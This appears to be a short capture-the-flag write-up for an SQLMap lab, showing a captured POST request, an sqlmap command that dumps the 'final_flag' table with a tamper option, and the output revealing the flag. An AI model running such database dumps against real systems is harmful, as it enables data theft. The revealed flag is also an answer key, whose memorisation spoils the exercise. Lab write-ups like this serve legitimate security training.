You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.

Q1. What's the contents of table final_flag?

```
cat req.txt
POST /action.php HTTP/1.1
Host: 154.57.164.82:31286
Content-Length: 8
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://154.57.164.82:31286
Referer: http://154.57.164.82:31286/shop.html
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=e3jjh4tqcd4loen8lo9rq79fkc; cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d
Connection: keep-alive

{"id":1}
            
            
            
            step 1 find the id parameter to test
```

```
sqlmap -r req.txt --dump -D production -T final_flag --tamper-between --batch

```

```
[10:33:48] [WARNING] increasing time delay to 2 seconds
{n07_50_h4rd_r16h7?!}
[10:37:29] [INFO] retrieved: 1
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+


```